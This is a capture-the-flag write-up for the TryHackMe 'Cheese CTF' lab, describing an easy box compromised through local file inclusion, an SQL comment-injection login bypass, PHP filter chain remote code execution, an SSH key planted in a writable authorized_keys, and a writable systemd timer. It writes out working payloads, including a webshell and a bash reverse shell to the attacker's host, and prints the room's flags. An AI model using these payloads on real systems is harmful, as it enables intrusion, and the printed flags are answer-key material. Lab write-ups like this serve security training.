# CTF Write-Up: [Cheese CTF](https://tryhackme.com/room/cheesectfv10)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}`

</details>

<details>
<summary>Root Flag</summary>

`THM{dca75486094810807faf4b7b0a929b11e5e0167c}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
3306/tcp  open  mysql
```

> **Note:** The initial full-port scan returned hundreds of open ports across the entire range — a deliberate honeypot effect. Rather than enumerate all of them, only the four ports with recognisable and relevant services (22, 80, 443, 3306) were carried forward for detailed investigation.

### Service Identification

The detailed Nmap scan (`-A`) crashed during NSE script scanning with an assertion failure (`nse_nsock.cc`) and did not save results. Services were identified manually instead:

**Port 443** — connecting directly with netcat returned an FTP banner disguised on the HTTPS port:

```bash
nc <IP_ADDRESS> 443
220 iFTP server vr-wu
```

**Port 80** — confirmed by visiting `http://<IP_ADDRESS>/` in a browser, which returned the Cheese Shop web application. Wappalyzer identified the stack:

| Component | Detail |
|-----------|--------|
| Web Server | Apache HTTP Server 2.4.41 |
| Language | PHP |
| OS | Ubuntu |

**Port 3306** — inferred from the MySQL credentials found later in `login.php` pointing to `localhost`.

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | Version unconfirmed (detailed scan failed) |
| 80 | HTTP | Apache 2.4.41 — PHP web application |
| 443 | FTP | iFTP server vr-wu — disguised on HTTPS port |
| 3306 | MySQL | Confirmed via source code leak |

### Web Enumeration

```bash
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```
index.html       (Status: 200)
login.php        (Status: 200)
users.html       (Status: 200)
messages.html    (Status: 200)
orders.html      (Status: 200)
images/          (Status: 301)
```

`messages.html` contained a link that immediately exposed the attack surface:

```html
<a href="secret-script.php?file=php://filter/resource=supersecretmessageforadmin">
  Message!
</a>
```

The `file=` parameter accepted PHP stream wrappers — a clear **Local File Inclusion (LFI)** vulnerability.

---

## 2. LFI — Source Code Disclosure

The `php://filter/convert.base64-encode` wrapper was used to read PHP source files without triggering execution:

```bash
curl -s "http://<IP_ADDRESS>/secret-script.php?file=php://filter/convert.base64-encode/resource=login.php" | base64 -d
```

The decoded `login.php` source revealed three critical findings:

**Database credentials hardcoded in plaintext:**
```php
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";
```

**Weak OR-only SQL filter:**
```php
$filtered = preg_replace('/\b[oO][rR]\b/', '', $input);
```

**Vulnerable SQL query using string interpolation:**
```sql
SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'
```

LFI was also confirmed by reading `/etc/passwd`, which revealed two local users with login shells: `comte` and `ubuntu`.

---

## 3. SQL Injection — Authentication Bypass

The filter only stripped the word `OR` — SQL comment injection was unaffected. Appending `'-- -` to the username commented out the password check entirely, as the query became:

```sql
SELECT * FROM users WHERE username='comte'-- - AND password='...'
```

The SQL engine ignores everything after the `-- -` comment sequence, bypassing the password check entirely — it is never evaluated. This was tested directly in the browser by visiting `http://<IP_ADDRESS>/login.php` and entering:

```
Username: comte'-- -
Password: anything
```

The server redirected to `supersecretadminpanel.html`, confirming successful authentication bypass.

---

## 4. RCE — PHP Filter Chain

With LFI confirmed, the `data://` wrapper was tested for RCE but was disabled — PHP's `allow_url_include` setting blocks it. The **PHP filter chain technique** works differently: rather than including a remote resource, it abuses PHP's built-in `iconv` character encoding conversions and `base64` filters to synthesise arbitrary PHP code from nothing, using only the `php://filter` wrapper which cannot be disabled without breaking core PHP functionality.

The filter chain generator was used to produce a webshell payload. The tool was cloned and run from the working directory, with the output captured directly into a shell variable — the `| grep "^php://"` strips the header line so only the chain string is stored:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git
```

```bash
CHAIN=$(python3 php_filter_chain_generator/php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | grep "^php://")
```

The chain was passed to the vulnerable endpoint using curl's `-G` flag (which sends parameters as a GET query string rather than a POST body) combined with `--data-urlencode` to automatically percent-encode the long filter chain string. The `--output -` flag was required because the response contains binary garbage mixed with the command output — without it, curl refuses to print binary content to the terminal:

```bash
curl -G --data-urlencode "file=${CHAIN}" --data-urlencode "cmd=id" "http://<IP_ADDRESS>/secret-script.php" --output - 2>/dev/null | strings | grep "uid"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`. A reverse shell was triggered:

```bash
# Listener
nc -lvnp 4444
```

```bash
curl -G --data-urlencode "file=${CHAIN}" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<tun0>/4444 0>&1'" "http://<IP_ADDRESS>/secret-script.php" --output - 2>/dev/null
```

### Shell Stabilisation

The raw netcat shell lacked job control and interactive features — signals like `Ctrl+C` would kill the connection rather than the running process, tab completion was absent, and tools like `sudo` that expect a proper TTY would behave unexpectedly. Stabilisation was performed in three steps:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

✅ Shell as `www-data`.

---

## 5. Lateral Movement — Writable authorized_keys

Enumerating `/home/comte/.ssh/` revealed that `authorized_keys` was **world-writable**:

```
-rw-rw-rw- 1 comte comte 0 Mar 25  2024 authorized_keys
```

An SSH key pair was generated on the target and the public key written into `authorized_keys`:

```bash
ssh-keygen -t rsa -f /tmp/comte_ssh_key -N ""
cat /tmp/comte_ssh_key.pub >> /home/comte/.ssh/authorized_keys
```

The private key was then printed and copied manually to the attacking machine:

```bash
cat /tmp/comte_ssh_key
```

The output (from `-----BEGIN OPENSSH PRIVATE KEY-----` to `-----END OPENSSH PRIVATE KEY-----`) was saved locally, then used to SSH in as `comte`:

```bash
chmod 600 /tmp/comte_ssh_key
ssh -i /tmp/comte_ssh_key comte@<IP_ADDRESS>
```

✅ Shell as `comte`.

---

## 6. User Flag

```bash
comte@ip-10-48-161-169:~$ cat user.txt
THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```

> 🚩 `THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}`

---

## 7. Privilege Escalation — Writable systemd Timer

Checking sudo privileges for `comte`:

```bash
sudo -l
```

```
(ALL) NOPASSWD: /bin/systemctl daemon-reload
(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
(ALL) NOPASSWD: /bin/systemctl start exploit.timer
(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

The associated service and timer files were inspected:

```bash
cat /etc/systemd/system/exploit.service
```

```ini
[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

```bash
ls -la /etc/systemd/system/exploit.timer
# -rwxrwxrwx 1 root root 87 Mar 29  2024 exploit.timer
```

The service copies `xxd` to `/opt/xxd` and sets the **SUID bit** — meaning `/opt/xxd` would run as root. The timer file was **world-writable**, allowing modification of when it fires.

The timer was rewritten to trigger immediately:

```bash
cat > /etc/systemd/system/exploit.timer << 'EOF'
[Unit]
Description=Exploit Timer
[Timer]
OnBootSec=1
OnUnitActiveSec=1
[Install]
WantedBy=timers.target
EOF
```

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start exploit.timer
sudo /bin/systemctl enable exploit.timer
```

After a brief wait, `/opt/xxd` appeared with the SUID bit set:

```
-rwsr-sr-x 1 root root 18712 /opt/xxd
```

`xxd` with SUID can read any file as root. The root flag was read directly:

```bash
/opt/xxd /root/root.txt | xxd -r
```

✅ Root flag obtained.

---

## 8. Root Flag

```bash
/opt/xxd /root/root.txt | xxd -r
THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```

> 🚩 `THM{dca75486094810807faf4b7b0a929b11e5e0167c}`

---

## 9. Attack Chain

```
Nmap Scan
    └─► Port 80 (Apache + PHP) — hundreds of open ports across full range (honeypot effect; only 22, 80, 443, 3306 investigated)

Web Enumeration
    └─► messages.html → secret-script.php?file= → LFI via PHP stream wrappers

LFI → login.php source disclosure
    └─► DB creds: comte:VeryCheesyPassword
    └─► SQL query logic + weak OR-only filter exposed

SQLi authentication bypass (comte'-- -)
    └─► Access to admin panel confirmed

PHP filter chain RCE (synacktiv/php_filter_chain_generator)
    └─► uid=33(www-data) → reverse shell

/home/comte/.ssh/authorized_keys world-writable
    └─► Wrote SSH public key → SSH as comte → user.txt

sudo -l → NOPASSWD: systemctl (daemon-reload, start, enable exploit.timer)
    └─► exploit.timer world-writable → modified OnBootSec/OnUnitActiveSec
    └─► exploit.service copies xxd with SUID → /opt/xxd as root
    └─► /opt/xxd /root/root.txt | xxd -r → root flag
```

---

## 10. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | LFI via unsanitised `file=` parameter accepting PHP stream wrappers | Arbitrary file read including PHP source; escalated to RCE via filter chain | Whitelist allowed file paths; disable dangerous PHP stream wrappers; never pass user input directly to file inclusion functions |
| 2 | Hardcoded database credentials in `login.php` | DB creds exposed via LFI | Store credentials in environment variables or a secrets manager; never hardcode credentials in source files |
| 3 | Incomplete SQL injection filter (OR only) | Authentication bypass via comment injection | Use prepared statements with parameterised queries; never build SQL queries via string concatenation |
| 4 | World-writable `authorized_keys` file | Any process can add SSH keys for `comte` | Set correct permissions (`chmod 600`); ensure `www-data` cannot write to user home directories |
| 5 | World-writable `exploit.timer` systemd unit | Timer behaviour modified to trigger SUID binary creation | Restrict write permissions on systemd unit files to root only |
| 6 | `exploit.service` creates SUID `xxd` binary | SUID `xxd` allows reading any file as root | Never create SUID copies of file-reading utilities; audit all systemd service `ExecStart` commands |

---

*Cheese CTF — TryHackMe | Rooted ✅*
